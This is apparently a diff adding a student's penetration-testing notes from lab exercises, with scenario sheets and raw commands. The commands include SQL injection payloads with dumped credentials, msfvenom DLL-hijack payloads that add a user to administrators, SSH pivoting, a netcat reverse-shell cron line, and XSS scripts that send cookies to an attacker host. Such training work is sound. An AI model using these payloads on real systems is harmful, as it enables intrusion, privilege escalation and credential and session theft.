@@ -196,4 +196,497 @@ PORT     STATE SERVICE
 49672/tcp open  unknown
 
 
+_______________________________________________________________________________________________________________________________________________________
+OPERATION: DRY RUN
+
+SITREP: This is a dry run operation to prepare you for tomorrow's real operation. You will be provided with a mission task sheet, RoE, and scope.
+
+Maintain 'low visibility' on the wire, as security products may be in place, and document your actions and results as you will be expected to provide OpNotes at the end of the operation.
+
+Take notes on this document.
+
+Dry Run Operation
+XX June 2024
+Start Time: 0830
+Duration: 3 hours
+
+Type of Operation: Information Systems Penetration Test
+
+Objective:Actively exploit and attack networked information systems for the purposes of identifying and reporting vulnerabilities.
+
+Tasking:Perform all tasks outlined in this document.
+
+Mission Scope:
+
+All public facing systems of target entitiy excluding devices responsible for networking (routers, switches, etc). Known web address will be supplied out of band.
+
+Internal network of target entity excluding devices responsible for networking (routers, switches, etc)
+
+
+RoE:
+
+Google docs, and all other shareable document platforms, are forbidden during this operation.
+
+All communication platforms and applications, such as Slack or Gmail, are forbidden during this operation.
+
+You are authorized to modify passwords to user accounts.
+
+Writing to disk is authorized on all machines.
+
+You will not destroy data/systems, perform DoS, or otherwise disrupt business operations of any entity during this penetration test.
+
+You will not use Metasploit tools for any affect with the exception of shellcode generation.
+
+You will not target routers, switches or other networking devices.
+
+You will not target entities or systems outside of the scope previously defined.
+
+You will not interfere with other entities' operations in any way.
+
+Prior Approvals: OSINT through publicly available resources. Scrape appropriate web content that will provide operational data. Testing of found credentials. NOT approved to change routing or destroy data.
+
+
+
+-------------------------------------------------------------------------------------------------------------------
+10.50.33.174
+
+
+nmap -Pn -T4 10.50.33.174 
+nmap -Pn -T4 10.50.33.174 -p 80 --script http-enum.nse
+
+
+Nmap scan report for 10.50.33.174
+Host is up (0.0086s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+| http-enum: 
+|   /login.php: Possible admin folder
+|   /login.html: Possible admin folder
+|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+
+ nc 10.50.33.174 80
+nc 10.50.33.174 22
+
+connect to the public website 
+
+can login as aaron with 
+user' or '1=1 
+
+username=user&passwd=user%27+or+%271%3D1 
+ gives you an lost of users 
+ Array
+(
+    [0] => user2
+    [name] => user2
+    [1] => RntyrfVfNER78
+    [pass] => RntyrfVfNER78
+)
+1Array
+(
+    [0] => user3
+    [name] => user3
+    [1] => Obo4GURRnccyrf
+    [pass] => Obo4GURRnccyrf
+)
+1Array
+(
+    [0] => Lee_Roth
+    [name] => Lee_Roth
+    [1] => anotherpassword4THEages
+    [pass] => anotherpassword4THEages
+)
+
+
+
+#!/usr/bin/python3
+
+import os
+
+system_user=user2
+user_password=EaglesIsARE78
+
+
+
+##Developer note
+
+#script will eventually take above system user credentials and run automated services
+~        
+
+
+ssh user2@10.50.33.174 
+EaglesIsARE78
+( Initial access)
+
+
+
+ The following lines are desirable for IPv6 capable hosts
+::1 ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+ff02::3 ip6-allhosts
+192.168.28.181 WebApp
+
+proxychains nmap -Pn -T4 192.168.28.181 -p 1-10000 2>/dev/null
+
+22/tcp open  ssh
+80/tcp open  http
+
+
+ CONNECT TO THE HTTP WEBSITE
+ 
+  pick random ones to see if any is vulnerable 
+  
+ http://0.0.0.0:2222/pick.php?product=7%20OR%201=1
+ 
+ http://0.0.0.0:2222/pick.php?product=7%20UNION%20select%20%20user_id,name,username%20from%20siteusers.users
+ 
+
+Item 	On Hand 	Price
+HAM 	32 	$15
+1 	Aaron 	$Aaron
+2 	user2 	$user2
+3 	user3 	$user3
+4 	Lroth 	$Lee_Roth
+1 	ncnffjbeqlCn$$jbeq 	$Aaron
+2 	RntyrfVfNER78 	$user2
+3 	Obo4GURRnccyrf 	$user3
+4 	anotherpassword4THEages 	$Lroth
+
+
+
+
+
+
+--------------------------------------------------------------------------------------------------------------
+10.50.33.174
+
+
+
+nmap -Pn -T4 10.50.33.174 
+
+
+ nc 10.50.33.174 80
+nc 10.50.33.174 22
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+| http-enum: 
+|   /login.php: Possible admin folder
+|   /login.html: Possible admin folder
+|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+
+
+_______________________________________________________________________________________________________________________________________________________
+Donovian Windows Privilege Escalation (DWP)
+XX Jan 2027
+Start Time: 1300
+Duration: 4 hours
+
+Type of Operation: Cyberspace Exploitation (C-E)
+
+Objective: Maneuver into the Donovian internal network, gain privileged access to discovered Windows host.
+
+Tools/Techniques: SSH and RDP masquerade into internal network with provided credentials. Ports in use will be dependent on target location and are subject to change. Windows techniques to gain privileged access such as DLL hijack, UAC bypass through weak paths, permissions, and tasks. Network scanning tools/technique usage is at the discretion of student.
+
+Scenario Credentials: FLAG = 3@SYw1nd0w55t@rt0F@ct1v1ty
+
+Prior Approvals: DLL hijack and UAC bypass, restarting of services through host reboot. Host survey utilizing native command shells, which shell is at discretion of student.
+
+Scheme of Maneuver:
+>internet_grey_host
+->Pivot: 192.168.28.105
+-->T1: 192.168.28.5
+
+Target Section:
+
+Pivot
+Hostname: Donovian-Terminal
+IP: 192.168.28.105
+OS: Ubuntu 18.04
+Creds: comrade :: StudentReconPassword
+Last Known SSH Port: 2222
+PSP: rkhunter
+Malware: none
+Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.
+
+T1
+Hostname: donovian-windows-private
+IP: 192.168.28.5
+OS: Windows ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: 3389
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+
+
+
+
+$ ssh -M -S ~/.ssh/CM/gray -o "ControlPersist=10m" student@10.50.40.200
+ssh -O forward -L2222:192.168.28.105:2222 -S ~/.ssh/CM/gray place
+ssh -M -S ~/.ssh/CM/Pivot -o "ControlPersist=10m" comrade@127.0.0.1 -p2222
+
+ssh -S ~/.ssh/CM/Pivot place -D 9050 ( DYNAMIC) 
+
+
+To T1(28.5)
+
+ssh -O forward -L3333:192.168.28.5:3389 -S ~/.ssh/CM/Pivot placer
+    xfreerdp /u:comrade /v:0.0.0.0:3333 /dynamic-resolution +glyph-cache +clipboard
+    
+    
+
+
+( AFTER RDP CHECK SERVICES )
+ find the  suspicious service 
+ 
+  try to check for dll that you cna hijack 
+  
+  create a custom dll payload on your ops 
+  msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\\Users\\comrade.WIN2-INTERNAL-D\\whoami.txt' -f dll > hijackmeplz.dll
+
+
+check who you have privs as 
+
+2102  msfvenom -p windows/exec CMD='cmd.exe /C "net localgroup administrators comrade /add"' -f dll > hijackmeplz.dll
+
+ elevate your privs 
+ 
+
+
+
+
+scp student@10.50.40.254:/home/student/SEC/hijackmeplz.dll 'C:\MemoryStatus\'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\\Users\\DemoAdmin\\Desktop\\whoami.txt' -f dll > WINMM.dll
+
+
+ check for services 
+ 
+ 
+ scp  student@10.50.40.254:/home/student/WINMM.dll C:\Users\student
+  schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive |Select-String -Pattern "COM handler" -NotMatch
+  
+  
+  
+  msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\\Users\\DemoAdmin\\Desktop\\whoami.txt' -f exe > 7z.exe
+
+
+scp student@10.50.40.254:/home/student/7z.exe 'C:\Program Files\7-Zip'
+
+
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\\Users\\DemoAdmin\\Desktop\\whoami.txt' -f exe > 7z.exe
+
+get-Eventlog -logname Security -newest 2  |Format-List
+
+_________________________________________________________________________________________________________________________________________________________
+Donovian Linux Privilege Escalation, and Persistence (DLP)
+XX Feb 2027
+Start Time: 1300
+Duration: 4 hours
+
+Type of Operation: Cyberspace Exploitation (C-E)
+
+Objective: Maneuver into the Donovian internal network, gain privileged access to discovered Linux hosts.
+
+Tools/Techniques: SSH masquerade into internal network with provided credentials. Ports in use will be dependent on target location and are subject to change. Linux techniques to gain privileged access and persist are limited to host misconfigurations, open suid/sgid, weak permissions, and path. Network scanning tools/technique usage is at the discretion of student.
+
+Scenario Credentials: FLAG = H@RDl1nux5t@rt0F@ct1v1ty
+
+Prior Approvals: Privilege escalation, persistence, and restarting of services through host reboot. Host survey and log sanitation utilizing native command shells, which shell is at discretion of student. NOT authorized is uploading of tools or altering account information.
+
+Scheme of Maneuver:
+>internet_grey_host
+->Pivot:192.168.28.105
+--->T1: 192.168.28.27
+--->T2: 192.168.28.12
+
+Target Section:
+
+Pivot
+Hostname: Donovian-Terminal
+IP: 192.168.28.105
+OS: Ubuntu 18.04
+Creds: comrade :: StudentReconPassword
+Last Known SSH Port: 2222
+PSP: rkhunter
+Malware: none
+Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.
+
+T1
+Hostname: unknown
+IP: 192.168.28.27
+OS: Linux ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: 22 (ssh)
+
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+
+T2
+Hostname: unknown
+IP: 192.168.28.12
+OS: Linux ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: unknown (22)
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+
+
+
+QUESTIONS:
+
+
+$ ssh -M -S ~/.ssh/CM/gray -o "ControlPersist=10m" student@10.50.40.200
+ssh -O forward -L2222:192.168.28.105:2222 -S ~/.ssh/CM/gray place
+ssh -M -S ~/.ssh/CM/T1 -o "ControlPersist=10m" comrade@127.0.0.1 -p2222
+
+ssh -S ~/.ssh/CM/Pivot place -D 9050 ( DYNAMIC) 
+
+
+To (253)
+
+ssh -O forward -L3333:192.168.150.253:3201 -S ~/.ssh/CM/T1 placer
+ssh -M -S ~/.ssh/CM/T2 -o "ControlPersist=10m" comrade@127.0.0.1 -p3333
+
+ ssh -S ~/.ssh/CM/T2 grayhost
+ 
+ 
+
+
+
+There is an SUID or SGID binary on the system that can be abused to obtain root access. There is a flag in root’s home directory.
+
+ find / -type f -perm /4000 -ls 2>/dev/null
+
+/etc/sudoers "comrade ALL=(ALL:ALL)ALL "
+
+ 
+ https://www.youtube.com/watch?v=lePqCJfdQnQ
+ cronJOB ONES 
+* * * * * /bin/nc -e /bin/bash 192.168.28.135 33403 >/dev/null 2>&1
+
+
+ -------------------------------------------------------------------------------------------------------------------------------------------------------
+ Gorgas Reverse Engineering (GRE)
+XX Sep 2025
+Start Time: 1300
+Duration: 4 hours
+
+Type of Operation: DEVOPS
+
+Objective: Intel has identified that the Donovian_Webserver (192.168.28.111) is hosting binaries via port 80 at the following URI /longTermStorage. We have been tasked with pulling the binaries back into blue space to conduct Reverse Enineering operations. Conduct Reverse Engineering (disassemble, debug) on collected files, determine functionality and methods to successfully execute files.
+
+Tools/Techniques: Ghidra, IDA, and GDB.
+
+Scenario Credentials: FLAG = R3V3R535t@rt0F@ct1v1ty
+
+Prior Approvals:All files can be extracted from the known target "Donovian-Webserver". Only authorized to conduct task on Analyst Workstations.
+
+T1
+Hostname: web.site.donovia
+IP: 192.168.28.111
+OS: unknown
+Creds: comrade::StudentWebExploitPassword
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Extract approved binaries under directory titled "longTermStorage".
+
+
+Situation:
+Various teams have extracted binaries from Donovian development networks. Analyze the given binaries to find weaknesses and create signatures.
+
+Provided:
+compiled executable: (entry.exe)
+source code: (entry.c)
+Task: Run the executable with expected input and retrieve success message.
+Method: disassemble the executable and follow the program’s execution to discover its functionality, and expected input.
+
+Ensure that before you move on from this challenge that you have fully understood what you have done to disassemble and reverse engineer this binary and how it is related to the provided source code.
+
+What is the key for this binary?
+
+
+
+Nmap scan report for 192.168.28.111
+Host is up (0.0028s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+8080/tcp open  http-proxy
+
+
+
+scp entry.exe 10.50.34.110:/users/student/desktop
+
+
+
+---------------------------------------------
+basic1.exe 
+
+to run start by running it  to see if it prompts for anything or you cna get any info to search for on gidhra.
+prompted for Enter key
+search for string Enter Key on gidhra
+
+find the success variable 
+
+
+
+
+9985
+
+ equal 18765
+ 
+ 
+ user','a','b',1);#
+ 
+ 
+ User1', 'a', 'b', 1);#
+ 
+ 
+ 
+ 
+ <script>document.location=http://<10.100.28.40>/uploads/cookie_stealer.php?username="+document.cookie;</script>
+
+
+<script>document.location="http://10.50.40.254:8000/"+document.cookie;</script>  
+
+
+
+
+<script>document.location=http://<10.100.28.40>/uploads/cookie_stealer.php?username="+document.cookie;</script>
+
+
+<script>document.location="http://10.50.40.254:8000/"+document.cookie;</script>  
+
+
+
 
